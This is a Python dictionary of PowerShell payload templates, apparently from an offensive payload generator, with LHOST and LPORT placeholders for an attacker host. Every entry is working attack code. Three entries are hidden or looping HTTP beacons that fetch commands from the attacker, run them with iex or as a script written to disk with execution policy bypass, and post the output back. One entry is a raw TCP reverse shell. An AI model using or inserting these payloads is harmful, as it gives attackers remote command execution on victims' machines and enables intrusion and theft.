payloads = {
    'ps_http': (
        "$LHOST = '{LHOST}'; $LPORT = {LPORT}; "
        "powershell -NoP -W Hidden -C \"iwr http://$LHOST:$LPORT/beacon -Headers @{Authorization='beacon-cmd'} | Out-Null; "
        "while($true){$cmd=(iwr http://$LHOST:$LPORT/cmd -Headers @{Authorization='beacon-cmd'}).Content.Trim(); if($cmd){$o=try{iex $cmd 2>&1 | Out-String}catch{$_.ToString()}; iwr http://$LHOST:$LPORT/ -Headers @{Authorization='beacon-cmd'} -Method POST -Body $o | Out-Null}; Start-Sleep -Seconds 3}\""
    ),
    'powerShellIEX': (
        '''$s='{LHOST}:{LPORT}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}'''
    ),
    'powershell outfile': (
        '''$s='{LHOST}:{LPORT}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}'''
    ),
    'powershell#1': (
        '''$LHOST = "{LHOST}"; $LPORT = {LPORT}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'''
    ),
}